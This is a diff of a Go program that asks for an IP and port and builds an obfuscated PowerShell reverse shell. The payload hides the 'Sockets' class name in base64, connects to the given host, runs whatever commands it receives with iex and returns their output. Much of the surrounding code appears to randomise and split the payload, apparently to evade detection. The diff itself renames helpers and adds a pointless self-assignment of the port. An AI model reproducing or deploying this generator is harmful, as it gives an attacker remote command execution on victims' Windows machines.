@@ -24,8 +24,8 @@ func main() {
 	Execute("clear")
 	ex, _ := os.Executable()
 	Env := os.Getenv("TEMP")
-	endlinx := strings.HasPrefix(ex, Env)
-	if endlinx {
+	end := strings.HasPrefix(ex, Env)
+	if end {
 		temp, _ := os.Getwd()
 		dir = temp 
 	} else {
@@ -59,6 +59,7 @@ func main() {
 		fmt.Scan(&port)
 		_, err := strconv.Atoi(port)
 		if err == nil {
+			port = port
 			break
 		}
 		color.Red("\n\n[!] Error : Puerto invalido")
@@ -85,8 +86,8 @@ func main() {
 
 	}
 
-	Payload := `$x = 'UwBvAGM'; $xd = 'AawBlA'; $client = New-Object System.Net.$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{0}{1}HQAcwA=' -f $x, $xd)))).TCPClient("` + ip + `" ,` + string(port) + `);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = ('{0}PS ' -f $sb) + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes(('{0}') -f $sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};('{0}.Close()' -f $client)`
-	Random := randomString(20)
+	Payload := `$x = 'UwBvAGM'; $xd = 'AawBlA'; $client = New-Object System.Net.$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{0}{1}HQAcwA=' -f $x, $xd)))).TCPClient("` + ip + `" ,` + port + `);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = ('{0}PS ' -f $sb) + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes(('{0}') -f $sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};('{0}.Close()' -f $client)`
+	Random := String(20)
 	var a []string
 	for _, va := range Random {
 
@@ -169,7 +170,6 @@ func Split(re *regexp.Regexp, s string, n int) []string {
 			strings = append(strings, s[beg:end])
 		}
 		beg = match[1]
-		// This also appends the current match
 		strings = append(strings, s[match[0]:match[1]])
 	}
 
@@ -180,18 +180,17 @@ func Split(re *regexp.Regexp, s string, n int) []string {
 	return strings
 }
 
-func randomInt(min, max int) int {
+func Int(min, max int) int {
 	return min + rand.Intn(max-min)
 }
 
-// Generate a random string of A-Z chars with len = l
-func randomString(len int) []string {
+func String(len int) []string {
 	var e []string
 
 	rand.Seed(time.Now().UnixNano())
 	bytes := make([]byte, len)
 	for i := range bytes {
-		bytes[i] = byte(randomInt(65, 90))
+		bytes[i] = byte(Int(65, 90))
 	}
 
 	for _, a := range string(bytes) {
